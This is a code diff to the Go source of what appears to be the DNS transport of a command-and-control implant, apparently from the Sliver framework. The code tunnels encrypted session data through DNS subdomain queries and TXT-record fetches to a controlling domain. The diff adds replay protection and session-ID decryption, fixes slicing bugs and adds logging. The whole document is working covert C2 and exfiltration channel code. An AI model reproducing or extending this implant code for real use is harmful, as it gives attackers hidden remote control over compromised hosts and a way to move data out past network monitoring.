@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"crypto/rsa"
+	"crypto/sha256"
 	"crypto/x509"
 	"encoding/base32"
 	"encoding/base64"
@@ -28,6 +29,8 @@ import (
 )
 
 const (
+	sessionIDSize = 16
+
 	dnsSendDomainSeg  = 63
 	dnsSendDomainStep = 189 // 63 * 3
 
@@ -40,9 +43,6 @@ const (
 
 	nonceStdSize = 6
 
-	// Base 32 encoding, so (n*8 + 4) / 5 = 63 means we can encode 39 bytes - 4 bytes for seq
-	byteBlockSize = 35
-
 	blockIDSize = 6
 
 	maxFetchTxts = 200 // How many txts to request at a time
@@ -52,6 +52,9 @@ var (
 	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
 
 	pollInterval = 1 * time.Second
+
+	replayMutex = &sync.RWMutex{}
+	replay      = &map[string]bool{}
 )
 
 // RecvBlock - Single block from server
@@ -66,6 +69,26 @@ type BlockReassembler struct {
 	Size int
 	Recv chan RecvBlock
 }
+
+// Basic message replay protect, hash the cipher text and store it in a map
+// we should never see duplicate ciphertexts. We have to maintain the map
+// for the duration of execution which isn't great. In the future we may want
+// to add time-stamps and clear old hashes to keep memory usage lower.
+// A re-key message could also help since we could clear all old msg digests
+func isReplayAttack(ciphertext []byte) bool {
+	sha := sha256.New()
+	sha.Write(ciphertext)
+	digest := base64.StdEncoding.EncodeToString(sha.Sum(nil))
+	replayMutex.Lock()
+	defer replayMutex.Unlock()
+	if _, ok := (*replay)[digest]; ok {
+		return true
+	}
+	(*replay)[digest] = true
+	return false
+}
+
+// --------------------------- DNS SESSION SEND ---------------------------
 
 func dnsLookup(domain string) (string, error) {
 	// {{if .Debug}}
@@ -85,6 +108,7 @@ func dnsLookup(domain string) (string, error) {
 func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {
 
 	encoded := dnsEncodeToString(data)
+	log.Printf("Full msg: %#v", encoded)
 	size := int(math.Ceil(float64(len(encoded)) / float64(dnsSendDomainStep)))
 	// {{if .Debug}}
 	log.Printf("Encoded message length is: %d (size = %d)", len(encoded), size)
@@ -92,9 +116,17 @@ func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {
 
 	nonce := dnsNonce(32) // Larger nonce for this use case
 
-	// DNS domains are limited to 254 characters including '.' so that means:
-	// 63 * 3 = 189 (+ 3 '.') + metadata
-	// So we at max send 3 subdomain's containing data
+	// DNS domains are limited to 254 characters including '.' so that means
+	// Base 32 encoding, so (n*8 + 4) / 5 = 63 means we can encode 39 bytes
+	// So we have 63 * 3 = 189 (+ 3x '.') + metadata
+	// So we can send up to (3 * 39) 117 bytes encoded as 3x 63 character subdomains
+	// We have a 4 byte uint32 seqence number, max msg size (2**32) * 117 = 502511173632
+	//
+	// Format: (subdata...).(seq).(nonce).(_)(msgType).<parent domain>
+	//                [63].[63].[63].[4].[32].[3].
+	//                    ... ~234 chars ...
+	//                Max parent domain: ~20 chars
+	//
 	for index := 0; index < size; index++ {
 		// {{if .Debug}}
 		log.Printf("Sending domain #%d of %d", index+1, size)
@@ -102,7 +134,7 @@ func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {
 		start := index * dnsSendDomainStep
 		stop := start + dnsSendDomainStep
 		if len(encoded) <= stop {
-			stop = len(encoded) - 1
+			stop = len(encoded)
 		}
 		// {{if .Debug}}
 		log.Printf("Send data[%d:%d] %d bytes", start, stop, len(encoded[start:stop]))
@@ -114,12 +146,12 @@ func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {
 		log.Printf("Subdata subdomains: %d", subdomains)
 		// {{end}}
 
-		subdata := []string{} // Break up into at most 3 subdomains
+		subdata := []string{} // Break up into at most 3 subdomains (189)
 		for dataIndex := 0; dataIndex < subdomains; dataIndex++ {
 			dataStart := dataIndex * dnsSendDomainSeg
 			dataStop := dataStart + dnsSendDomainSeg
 			if len(data) < dataStop {
-				dataStop = len(data) - 1
+				dataStop = len(data)
 			}
 			// {{if .Debug}}
 			log.Printf("Subdata #%d [%d:%d]: %#v", dataIndex, dataStart, dataStop, data[dataStart:dataStop])
@@ -161,7 +193,6 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 	sessionKey := RandomAESKey()
 
 	pubKey := dnsGetServerPublicKey()
-	sessionInitID := dnsSessionID()
 	dnsSessionInit := &pb.DNSSessionInit{
 		Key: sessionKey[:],
 	}
@@ -171,11 +202,20 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 		return "", AESKey{}, err
 	}
 
-	err = dnsSend(parentDomain, sessionInitMsg, encryptedData)
+	encryptedSessionID, err := dnsSend(parentDomain, sessionInitMsg, encryptedData)
 	if err != nil {
 		return "", AESKey{}, errors.New("Failed to start new DNS session")
 	}
-	return sessionInitID, sessionKey, nil
+	encryptedSessionIDData, err := base64.StdEncoding.DecodeString(encryptedSessionID)
+	if err != nil || isReplayAttack(encryptedSessionIDData) {
+		return "", AESKey{}, errors.New("Failed to decode session id")
+	}
+	sessionID, err := GCMDecrypt(sessionKey, encryptedSessionIDData)
+	if err != nil {
+		return "", AESKey{}, errors.New("Failed to decrypt session id")
+	}
+
+	return string(sessionID), sessionKey, nil
 }
 
 // Get the public key of the server
@@ -195,6 +235,7 @@ func dnsGetServerPublicKey() *rsa.PublicKey {
 		// {{end}}
 		return nil
 	}
+	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(pubKeyBlock))
 
 	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
 	if certErr == nil {
@@ -236,8 +277,6 @@ func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 	// {{end}}
 	return getBlock(parentDomain, fields[0], fields[1])
 }
-
-// --------------------------- DNS SESSION SEND ---------------------------
 
 // --------------------------- DNS SESSION RECV ---------------------------
 
@@ -363,7 +402,7 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, stop int, wg *sync.WaitGroup) {
 	defer wg.Done()
 	nonce := dnsNonce(nonceStdSize)
-	domain := fmt.Sprintf("_%s.%d.%d.%s._b.%s", nonce, start, stop, reasm.ID, parentDomain)
+	domain := fmt.Sprintf("_%s.%d.%d.%s.%s.%s", nonce, start, stop, reasm.ID, blockReqMsg, parentDomain)
 	// {{if .Debug}}
 	log.Printf("[dns] fetch -> %s", domain)
 	// {{end}}
@@ -442,13 +481,23 @@ func sessionEncrypt(sessionKey AESKey, data []byte) string {
 	return dnsEncodeToString(encryptedData)
 }
 
+func fingerprintSHA256(block *pem.Block) string {
+	hash := sha256.Sum256(block.Bytes)
+	b64hash := base64.StdEncoding.EncodeToString(hash[:])
+	return strings.TrimRight(b64hash, "=")
+}
+
 // --------------------------- ENCODER ---------------------------
 var base32Alphabet = "0123456789abcdefghjkmnpqrtuvwxyz"
-var lowerBase32 = base32.NewEncoding(base32Alphabet)
+var sliverBase32 = base32.NewEncoding(base32Alphabet)
 
 // EncodeToString encodes the given byte slice in base32
-func dnsEncodeToString(in []byte) string {
-	return strings.TrimRight(lowerBase32.EncodeToString(in), "=")
+func dnsEncodeToString(input []byte) string {
+	encoded := sliverBase32.EncodeToString(input)
+	// {{if .Debug}}
+	log.Printf("[base32] %#v", encoded)
+	// {{end}}
+	return strings.TrimRight(encoded, "=")
 }
 
 // DecodeString decodes the given base32 encodeed bytes
@@ -462,8 +511,7 @@ func dnsDecodeString(raw string) ([]byte, error) {
 			nb[len(raw)+index] = '='
 		}
 	}
-
-	return lowerBase32.DecodeString(string(nb))
+	return sliverBase32.DecodeString(string(nb))
 }
 
 // SessionIDs are public parameters in this use case
